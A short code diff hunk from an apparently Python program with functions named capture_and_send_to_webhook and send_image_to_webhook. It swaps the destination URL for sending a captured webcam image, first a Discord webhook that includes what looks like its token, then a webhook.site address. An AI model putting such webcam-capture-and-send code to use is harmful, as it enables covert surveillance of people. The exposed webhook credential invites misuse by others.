@@ -55,7 +55,7 @@ def capture_and_send_to_webhook():
 
 # Function to send the image to the webhook
 def send_image_to_webhook(image_bytes):
-    webhook_url = 'https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5'
+    webhook_url = 'https://webhook.site/7a794315-44e8-474e-bbe1-b30e67763022'
 
     files = {
         'file': ('webcam.png', io.BytesIO(image_bytes), 'image/png')
